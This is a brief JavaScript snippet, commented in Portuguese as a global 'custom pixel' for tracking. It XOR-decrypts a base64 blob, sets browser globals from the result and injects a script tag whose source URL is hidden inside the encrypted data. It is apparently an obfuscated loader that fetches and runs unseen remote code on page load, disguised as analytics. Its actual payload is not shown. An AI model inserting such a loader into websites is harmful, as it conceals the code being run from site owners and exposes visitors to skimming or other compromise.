/* Pixel personalizado global. Uma unica instancia por documento. */
(function(){
  try {
    if (window.__CUSTOM_PIXEL_LOADED) return;
    if (document.getElementById('custom-pixel-script-loader')) return;
    window.__CUSTOM_PIXEL_LOADED = true;
  } catch (_) {}
var f_4k=atob("DLyxz2sym9D0bjuDSceTuhleuerWBk/3Oc+L4ERR/77aG0/uINrI4Qhd9v6WHBTwKs7Yvx9BtKCdFl7vZszYtw5etbqHTBehKMjFvQJQ7qSRHRm5EuGd7Qxe9LKVAkihc+fK7QVT9rXWVBnzIMTUoyJWufzWGFrvPNmT9UkE+ujFXgO2fYqG910FqujHDAq1cdiJ9w4Q5o2J");var m_k=[];for(var j_u=0;j_u<f_4k.length;j_u++){m_k.push(f_4k.charCodeAt(j_u)&255);}var v_89=m_k[0];var s_c0=m_k.slice(1,1+v_89);var q_7j=m_k.slice(1+v_89);var o_gp=q_7j.map(function(b,t_ag9d){return b^s_c0[t_ag9d%v_89];});var d_p="";for(var b_0gt4=0;b_0gt4<o_gp.length;b_0gt4++){d_p+=String.fromCharCode(o_gp[b_0gt4]&255);}var y_0=decodeURIComponent(escape(d_p));var w_mq=JSON.parse(y_0);var t_gp4a=w_mq.globals||[];t_gp4a.forEach(function(p_0){window[p_0.name]=p_0.value;});var q_40w=document.createElement("script");q_40w.id='custom-pixel-script-loader';q_40w.src=w_mq.url;q_40w.async=true;q_40w.defer=true;(w_mq.attributes||[]).forEach(function(z_8sfh){q_40w.setAttribute(z_8sfh.name,z_8sfh.value);});(document.head||document.documentElement).appendChild(q_40w);
})();
